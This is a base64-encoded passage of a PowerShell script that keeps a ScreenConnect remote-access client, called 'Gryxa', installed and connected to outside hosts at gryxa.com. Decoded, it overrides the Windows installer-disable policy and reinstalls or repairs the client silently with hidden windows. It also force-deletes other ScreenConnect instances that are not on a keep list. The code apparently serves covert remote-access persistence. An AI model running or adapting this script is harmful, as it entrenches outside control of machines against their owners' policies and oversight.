ICRndWlkID0gJG51bGwKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9v
dHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAg
ICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkg
JGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAg
ICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGls
ZE5hbWUgLWxpa2UgJ3sqfScpKSB7ICRndWlkID0gJGtleS5QU0NoaWxkTmFtZTsgYnJlYWsgfQog
ICAgICAgIH0KICAgICAgICBpZiAoJGd1aWQpIHsgYnJlYWsgfQogICAgfQogICAgaWYgKC1ub3Qg
JGd1aWQpIHsgcmV0dXJuICdub3QtcmVnaXN0ZXJlZCcgfQogICAgJiByZWcuZXhlIGRlbGV0ZSAn
SEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERp
c2FibGVNU0kgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRX
QVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAv
dCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgICRsb2cgPSBKb2luLVBhdGgg
JFdvcmtEaXIgIm1zaV9yZXBhaXJfJEZpbmdlcnByaW50LmxvZyIKICAgICRwID0gU3RhcnQtUHJv
Y2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvZmEgJGd1aWQgL3FuIC9ub3Jlc3RhcnQg
L0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBhc3NUaHJ1CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA4
CiAgICAmIHNjLmV4ZSBjb25maWcgIiRuYW1lIiBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwK
ICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVl
cCAtU2Vjb25kcyA0CiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdS
dW5uaW5nJykgeyByZXR1cm4gInN2Yy1yZXN0b3JlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAg
ICBpZiAoJHN2YykgeyByZXR1cm4gInN2Yy1zdGlsbC1zdG9wcGVkIGV4aXQ9JCgkcC5FeGl0Q29k
ZSkiIH0KICAgIHJldHVybiAic3ZjLXN0aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRDb2RlKSIK
fQoKIyDilIDilIAgR3J5eGEgTVVTVC1SVU4gaGVhbHRoIChMMTYpIOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAojIEwxNjogTkVWRVIgcmVpbnN0YWxsIHdoZW4gc2Vy
dmljZSBpcyBSdW5uaW5nIChwYW5lbCBkdXBsaWNhdGVzKS4KIyAgICAgIFRDUC9yZWxheSBhcmUg
YWR2aXNvcnkgb25seS4gUmVpbnN0YWxsIG9ubHk6IG1pc3Npbmcvc3RvcHBlZCBPUiBGUCBkcmlm
dCBPUiAtRm9yY2UuCiMgTDE1OiBncnl4YS1oZWFsdGggLyBncnl4YS1lbnN1cmUg4oCUIDhoIGRl
ZXAgY2hlY2sgKFRDUC9yZWxheS9GUCBkcmlmdCByZWluc3RhbGwpLgokc2NyaXB0OkdyeXhhRGVm
YXVsdEZwID0gJzk5MDgxOThlNjY4ZTQ3NTAnCiRzY3JpcHQ6R3J5eGFNc2lVcmwgPSAnaHR0cHM6
Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpP2U9QWNjZXNz
Jnk9R3Vlc3QnCiRzY3JpcHQ6R3J5eGFSZWxheUhvc3QgPSAndXBkYXRlLmdyeXhhLmNvbScKJHNj
cmlwdDpHcnl4YVVpSG9zdCA9ICd1aS5ncnl4YS5jb20nCiRzY3JpcHQ6U2V2cnpLZWVwID0gQCgn
NWY2MDEwNTc5ODUyZTUwNycsICdmODYxYzgxNDBkNDUzNDI3JykKCmZ1bmN0aW9uIEdldC1Hcnl4
YUNmZ1BhdGggeyBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhLmNmZycgfQoKZnVuY3Rpb24gR2V0
LUdyeXhhRnAgewogICAgJGZwID0gJHNjcmlwdDpHcnl4YURlZmF1bHRGcAogICAgJHAgPSBHZXQt
R3J5eGFDZmdQYXRoCiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgewogICAgICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnXkNVUlJFTlRf
RlA9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkg
fQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkZnAKfQoKZnVuY3Rpb24gU2V0LUdyeXhhRnAo
W3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1
cm4gfQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7CiAg
ICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2Ug
fCBPdXQtTnVsbAogICAgfQogICAgQCgKICAgICAgICAiQ1VSUkVOVF9GUD0kKCRGaW5nZXJwcmlu
dC5Ub0xvd2VyKCkpIgogICAgICAgICJSRUxBWT0kKCRzY3JpcHQ6R3J5eGFSZWxheUhvc3QpIgog
ICAgICAgICJVST0kKCRzY3JpcHQ6R3J5eGFVaUhvc3QpIgogICAgICAgICJNU0lVUkw9JCgkc2Ny
aXB0OkdyeXhhTXNpVXJsKSIKICAgICAgICAiVVBEQVRFRD0kKChHZXQtRGF0ZSkuVG9Vbml2ZXJz
YWxUaW1lKCkuVG9TdHJpbmcoJ28nKSkiCiAgICApIHwgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRo
IChHZXQtR3J5eGFDZmdQYXRoKSAtRW5jb2RpbmcgQVNDSUkgLUZvcmNlCn0KCmZ1bmN0aW9uIEdl
dC1LZWVwRmluZ2VycHJpbnRzIHsKICAgICRnID0gR2V0LUdyeXhhRnAKICAgIEAoJzVmNjAxMDU3
OTg1MmU1MDcnLCAnZjg2MWM4MTQwZDQ1MzQyNycsICRnKSB8IFNlbGVjdC1PYmplY3QgLVVuaXF1
ZQp9CgpmdW5jdGlvbiBUZXN0LVRjcEhvc3RQb3J0KFtzdHJpbmddJEhvc3ROYW1lLCBbaW50XSRQ
b3J0ID0gNDQzLCBbaW50XSRUaW1lb3V0TXMgPSA4MDAwKSB7CiAgICBpZiAoLW5vdCAkSG9zdE5h
bWUpIHsgcmV0dXJuICRmYWxzZSB9CiAgICAkY2xpZW50ID0gJG51bGwKICAgIHRyeSB7CiAgICAg
ICAgJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudAogICAg
ICAgICRpYXIgPSAkY2xpZW50LkJlZ2luQ29ubmVjdCgkSG9zdE5hbWUsICRQb3J0LCAkbnVsbCwg
JG51bGwpCiAgICAgICAgaWYgKC1ub3QgJGlhci5Bc3luY1dhaXRIYW5kbGUuV2FpdE9uZSgkVGlt
ZW91dE1zLCAkZmFsc2UpKSB7CiAgICAgICAgICAgIHRyeSB7ICRjbGllbnQuQ2xvc2UoKSB9IGNh
dGNoIHt9CiAgICAgICAgICAgIHJldHVybiAkZmFsc2UKICAgICAgICB9CiAgICAgICAgJGNsaWVu
dC5FbmRDb25uZWN0KCRpYXIpCiAgICAgICAgcmV0dXJuICR0cnVlCiAgICB9IGNhdGNoIHsKICAg
ICAgICByZXR1cm4gJGZhbHNlCiAgICB9IGZpbmFsbHkgewogICAgICAgIGlmICgkY2xpZW50KSB7
IHRyeSB7ICRjbGllbnQuQ2xvc2UoKSB9IGNhdGNoIHt9IH0KICAgIH0KfQoKZnVuY3Rpb24gR2V0
LU1zaVByb3BlcnR5KFtzdHJpbmddJE1zaVBhdGgsIFtzdHJpbmddJFByb3BlcnR5TmFtZSkgewog
ICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1zaVBhdGgpKSB7IHJldHVybiAk
bnVsbCB9CiAgICB0cnkgewogICAgICAgICRpbnN0YWxsZXIgPSBOZXctT2JqZWN0IC1Db21PYmpl
Y3QgV2luZG93c0luc3RhbGxlci5JbnN0YWxsZXIKICAgICAgICAkZGIgPSAkaW5zdGFsbGVyLk9w
ZW5EYXRhYmFzZSgoUmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTXNpUGF0aCkuUGF0aCwgMCkK
ICAgICAgICAkdmlldyA9ICRkYi5PcGVuVmlldygiU0VMRUNUIGBWYWx1ZWAgRlJPTSBgUHJvcGVy
dHlgIFdIRVJFIGBQcm9wZXJ0eWA9JyRQcm9wZXJ0eU5hbWUnIikKICAgICAgICAkdmlldy5FeGVj
dXRlKCkgfCBPdXQtTnVsbAogICAgICAgICRyZWMgPSAkdmlldy5GZXRjaCgpCiAgICAgICAgaWYg
KC1ub3QgJHJlYykgeyByZXR1cm4gJG51bGwgfQogICAgICAgIHJldHVybiBbc3RyaW5nXSRyZWMu
U3RyaW5nRGF0YSgxKQogICAgfSBjYXRjaCB7CiAgICAgICAgcmV0dXJuICRudWxsCiAgICB9Cn0K
CmZ1bmN0aW9uIEdldC1GcEZyb21Qcm9kdWN0TmFtZShbc3RyaW5nXSRQcm9kdWN0TmFtZSkgewog
ICAgaWYgKCRQcm9kdWN0TmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsgcmV0
dXJuICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9CiAgICByZXR1cm4gJG51bGwKfQoKZnVuY3Rpb24g
RmluZC1Qcm9kdWN0R3VpZChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgJG5hbWUgPSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICBmb3JlYWNoICgkcm9vdCBpbiAk
c2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9v
dCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0g
JHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAgICRkbiA9
IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
bnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1l
KSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkgewogICAgICAgICAgICAgICAg
cmV0dXJuICRrZXkuUFNDaGlsZE5hbWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAg
IHJldHVybiAkbnVsbAp9CgpmdW5jdGlvbiBUZXN0LUdyeXhhUmVsYXlDb25maWd1cmVkKFtzdHJp
bmddJEZpbmdlcnByaW50KSB7CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZp
bmdlcnByaW50KSIKICAgICRkaXJzID0gQCgKICAgICAgICAoSm9pbi1QYXRoICR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiKSwKICAg
ICAgICAoSm9pbi1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JEZpbmdlcnByaW50KSIpCiAgICApCiAgICAkcGF0dGVybnMgPSBAKCd1cGRhdGUuZ3J5eGEuY29t
JywgJ3VpLmdyeXhhLmNvbScsICdncnl4YS5jb20nKQogICAgZm9yZWFjaCAoJGQgaW4gJGRpcnMp
IHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsgY29udGlu
dWUgfQogICAgICAgICRmaWxlcyA9IEAoR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGQgLUZp
bGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCA2
MCkKICAgICAgICBmb3JlYWNoICgkZiBpbiAkZmlsZXMpIHsKICAgICAgICAgICAgZm9yZWFjaCAo
JHBhdCBpbiAkcGF0dGVybnMpIHsKICAgICAgICAgICAgICAgIGlmIChTZWxlY3QtU3RyaW5nIC1M
aXRlcmFsUGF0aCAkZi5GdWxsTmFtZSAtUGF0dGVybiAkcGF0IC1TaW1wbGVNYXRjaCAtUXVpZXQg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsKICAgICAgICAgICAgICAgICAgICByZXR1
cm4gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICB0cnkg
ewogICAgICAgICAgICAgICAgaWYgKCRmLkxlbmd0aCAtZ3QgMk1CKSB7IGNvbnRpbnVlIH0KICAg
ICAgICAgICAgICAgICRieXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkZi5G
dWxsTmFtZSkKICAgICAgICAgICAgICAgICR0ZXh0ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6
VW5pY29kZS5HZXRTdHJpbmcoJGJ5dGVzKQogICAgICAgICAgICAgICAgaWYgKCR0ZXh0IC1tYXRj
aCAnZ3J5eGFcLmNvbScpIHsgcmV0dXJuICR0cnVlIH0KICAgICAgICAgICAgICAgICR0ZXh0OCA9
IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKCRieXRlcykKICAgICAgICAg
ICAgICAgIGlmICgkdGV4dDggLW1hdGNoICdncnl4YVwuY29tJykgeyByZXR1cm4gJHRydWUgfQog
ICAgICAgICAgICB9IGNhdGNoIHt9CiAgICAgICAgfQogICAgfQogICAgJGltZyA9IChHZXQtSXRl
bVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcJG5hbWUi
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5JbWFnZVBhdGgKICAgIGlmICgkaW1nIC1h
bmQgKCRpbWcgLW1hdGNoICdncnl4YVwuY29tJykpIHsgcmV0dXJuICR0cnVlIH0KICAgIGlmIChG
aW5kLVByb2R1Y3RHdWlkICRGaW5nZXJwcmludCkgeyByZXR1cm4gJHRydWUgfQogICAgcmV0dXJu
ICRmYWxzZQp9CgpmdW5jdGlvbiBUZXN0LVNjUnVubmluZyhbc3RyaW5nXSRGaW5nZXJwcmludCkg
ewogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAkZmFsc2UgfQogICAgJHN2YyA9
IEdldC1TZXJ2aWNlIC1OYW1lICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIHJldHVybiBbYm9vbF0oJHN2YyAtYW5k
ICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpCn0KCmZ1bmN0aW9uIFRlc3QtU2NEaXIoW3N0cmlu
Z10kRmluZ2VycHJpbnQpIHsKICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9LCAkZW52OlByb2dyYW1GaWxlcykpIHsKICAgICAgICBpZiAoVGVzdC1QYXRoIC1M
aXRlcmFsUGF0aCAoSm9pbi1QYXRoICRiYXNlICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdl
cnByaW50KSIpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICB9CiAgICByZXR1cm4gJGZhbHNlCn0KCmZ1
bmN0aW9uIEZpbmQtUnVubmluZ0dyeXhhRnAgewogICAgIyBQcmVmZXIgY2ZnIEZQIGlmIFJ1bm5p
bmc7IGVsc2UgYW55IG5vbi1zZXZyeiBTQyB0aGF0IGxvb2tzIGxpa2UgR3J5eGEgLyBpcyBzb2xl
IGV4dHJhLgogICAgJGNmZyA9IEdldC1Hcnl4YUZwCiAgICBpZiAoVGVzdC1TY1J1bm5pbmcgJGNm
ZykgeyByZXR1cm4gJGNmZyB9CiAgICAkZXh0cmFzID0gQCgpCiAgICBmb3JlYWNoICgkc3ZjIGlu
IChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICBpZiAoJHN2Yy5TdGF0dXMgLW5lICdSdW5uaW5n
JykgeyBjb250aW51ZSB9CiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZd
ezE2fSlcKScpIHsKICAgICAgICAgICAgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAg
ICAgICAgIGlmICgkZnAgLWluICRzY3JpcHQ6U2V2cnpLZWVwKSB7IGNvbnRpbnVlIH0KICAgICAg
ICAgICAgJGV4dHJhcyArPSAkZnAKICAgICAgICB9CiAgICB9CiAgICBmb3JlYWNoICgkZnAgaW4g
JGV4dHJhcykgewogICAgICAgIGlmIChUZXN0LUdyeXhhUmVsYXlDb25maWd1cmVkICRmcCkgeyBy
ZXR1cm4gJGZwIH0KICAgIH0KICAgIGlmICgkZXh0cmFzLkNvdW50IC1lcSAxKSB7IHJldHVybiAk
ZXh0cmFzWzBdIH0KICAgIHJldHVybiAkbnVsbAp9CgpmdW5jdGlvbiBUZXN0LUdyeXhhSGVhbHRo
IHsKICAgICMgTE9DQUwgaGVhbHRoIG9ubHkuIFRDUC9yZWxheSBuZXZlciBtYXJrIFVOSEVBTFRI
WSAoYXZvaWRzIHBhbmVsIGR1cGxpY2F0ZXMpLgogICAgJGZwID0gR2V0LUdyeXhhRnAKICAgICRy
dW5uaW5nRnAgPSBGaW5kLVJ1bm5pbmdHcnl4YUZwCiAgICBpZiAoJHJ1bm5pbmdGcCkgewogICAg
ICAgIGlmICgkcnVubmluZ0ZwIC1uZSAkZnApIHsgU2V0LUdyeXhhRnAgJHJ1bm5pbmdGcDsgJGZw
ID0gJHJ1bm5pbmdGcCB9CiAgICAgICAgJHRjcFJlbGF5ID0gVGVzdC1UY3BIb3N0UG9ydCAkc2Ny
aXB0OkdyeXhhUmVsYXlIb3N0IDQ0MwogICAgICAgICR0Y3BVaSA9IFRlc3QtVGNwSG9zdFBvcnQg
JHNjcmlwdDpHcnl4YVVpSG9zdCA0NDMKICAgICAgICByZXR1cm4gIkhFQUxUSFl8JGZwfHJ1bm5p
bmc9MXxyZWxheT0kdGNwUmVsYXl8dWk9JHRjcFVpIgogICAgfQoKICAgICRyZWFzb25zID0gTmV3
LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ10KICAgIGlmICgt
bm90IChUZXN0LVNjUnVubmluZyAkZnApKSB7CiAgICAgICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1O
YW1lICJTY3JlZW5Db25uZWN0IENsaWVudCAoJGZwKSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUKICAgICAgICBpZiAoLW5vdCAkc3ZjKSB7IFt2b2lkXSRyZWFzb25zLkFkZCgnc3ZjLW1p
c3NpbmcnKSB9CiAgICAgICAgZWxzZSB7IFt2b2lkXSRyZWFzb25zLkFkZCgic3ZjLSQoJHN2Yy5T
dGF0dXMpIikgfQogICAgfQogICAgaWYgKC1ub3QgKFRlc3QtU2NEaXIgJGZwKSAtYW5kIC1ub3Qg
KEZpbmQtUHJvZHVjdEd1aWQgJGZwKSkgewogICAgICAgIFt2b2lkXSRyZWFzb25zLkFkZCgnbm90
LWluc3RhbGxlZCcpCiAgICB9CgogICAgJHRjcFJlbGF5ID0gVGVzdC1UY3BIb3N0UG9ydCAkc2Ny
aXB0OkdyeXhhUmVsYXlIb3N0IDQ0MwogICAgJHRjcFVpID0gVGVzdC1UY3BIb3N0UG9ydCAkc2Ny
aXB0OkdyeXhhVWlIb3N0IDQ0MwogICAgaWYgKCRyZWFzb25zLkNvdW50IC1lcSAwKSB7CiAgICAg
ICAgIyByZWdpc3RlcmVkL2RpciBwcmVzZW50IGJ1dCBzZXJ2aWNlIG5vdCBydW5uaW5nIOKAlCBz
dGlsbCB1bmhlYWx0aHkgZm9yIHN0YXJ0L3JlcGFpcgogICAgICAgIGlmICgtbm90IChUZXN0LVNj
UnVubmluZyAkZnApKSB7CiAgICAgICAgICAgIHJldHVybiAiVU5IRUFMVEhZfCRmcHxzdmMtbm90
LXJ1bm5pbmd8cmVsYXk9JHRjcFJlbGF5fHVpPSR0Y3BVaSIKICAgICAgICB9CiAgICAgICAgcmV0
dXJuICJIRUFMVEhZfCRmcHxyZWxheT0kdGNwUmVsYXl8dWk9JHRjcFVpIgogICAgfQogICAgcmV0
dXJuICJVTkhFQUxUSFl8JGZwfCQoJHJlYXNvbnMgLWpvaW4gJywnKXxyZWxheT0kdGNwUmVsYXl8
dWk9JHRjcFVpIgp9CgpmdW5jdGlvbiBUZXN0LUdyeXhhUmVpbnN0YWxsQWxsb3dlZCB7CiAgICAj
IE1heCBvbmUgcmVpbnN0YWxsIHBlciAxMmggdW5sZXNzIC1Gb3JjZSAoc3RvcHMgZHVwbGljYXRl
IHN0b3JtKQogICAgJGZsYWcgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhX3JlaW5zdGFsbC5m
bGFnJwogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGZsYWcpKSB7IHJldHVy
biAkdHJ1ZSB9CiAgICB0cnkgewogICAgICAgICRhZ2UgPSAoR2V0LURhdGUpIC0gKEdldC1JdGVt
IC1MaXRlcmFsUGF0aCAkZmxhZykuTGFzdFdyaXRlVGltZQogICAgICAgIHJldHVybiAoJGFnZS5U
b3RhbEhvdXJzIC1nZSAxMikKICAgIH0gY2F0Y2ggeyByZXR1cm4gJHRydWUgfQp9CgpmdW5jdGlv
biBNYXJrLUdyeXhhUmVpbnN0YWxsIHsKICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9p
bi1QYXRoICRXb3JrRGlyICdncnl4YV9yZWluc3RhbGwuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUp
LlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQp9
CgpmdW5jdGlvbiBVbmluc3RhbGwtU2NGaW5nZXJwcmludChbc3RyaW5nXSRGaW5nZXJwcmludCkg
ewogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAnbm8tZnAnIH0KICAgICRuYW1l
ID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIgogICAgJGd1aWQgPSBGaW5k
LVByb2R1Y3RHdWlkICRGaW5nZXJwcmludAogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kg
L2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGlj
aWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdP
UkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgIGlmICgkZ3VpZCkgewogICAgICAgICRwID0g
U3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25v
cmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5
bGUgSGlkZGVuCiAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNgogICAgfQogICAgJHN2YyA9
IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAg
ICBpZiAoJHN2YykgewogICAgICAgICYgc2MuZXhlIHN0b3AgJG5hbWUgMj4mMSB8IE91dC1OdWxs
CiAgICAgICAgJiBzYy5leGUgZGVsZXRlICRuYW1lIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFN0
YXJ0LVNsZWVwIC1TZWNvbmRzIDIKICAgIH0KICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9LCAkZW52OlByb2dyYW1GaWxlcykpIHsKICAgICAgICAkZCA9IEpv
aW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAg
ICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgJiB0YWtlb3du
LmV4ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBSZW1vdmUtSXRl
bSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICdyZW1vdmVkJwp9CgpmdW5jdGlvbiBJ
bnN0YWxsLUdyeXhhRnJvbU1zaShbc3RyaW5nXSRNc2lQYXRoKSB7CiAgICAmIHJlZy5leGUgZGVs
ZXRlICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicg
L3YgRGlzYWJsZU1TSSAvZiAyPiYxIHwgT3V0LU51bGwKICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1c
U09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxl
TVNJIC90IFJFR19EV09SRCAvZCAwIC9mIDI+JjEgfCBPdXQtTnVsbAogICAgJGxvZyA9IEpvaW4t
UGF0aCAkV29ya0RpciAnbXNpX2dyeXhhX2Vuc3VyZS5sb2cnCiAgICAkcCA9IFN0YXJ0LVByb2Nl
c3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2kgYCIkTXNpUGF0aGAiIC9xbiAvbm9yZXN0
YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgYCIkbG9nYCIiIC1XYWl0
IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAkZXhpdCA9ICRwLkV4aXRDb2RlCiAg
ICBpZiAoJGV4aXQgLWVxIDE2MTgpIHsKICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAzMAog
ICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvaSBg
IiRNc2lQYXRoYCIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJl
c3MgL0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAg
ICAgICAkZXhpdCA9ICRwLkV4aXRDb2RlCiAgICB9CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAx
MAogICAgcmV0dXJuICRleGl0Cn0KCmZ1bmN0aW9uIEludm9rZS1Hcnl4YUVuc3VyZSB7CiAgICAj
IEhBUkQgUlVMRTogaWYgR3J5eGEgc2VydmljZSBpcyBSdW5uaW5nIOKGkiBuZXZlciAveCBvciAv
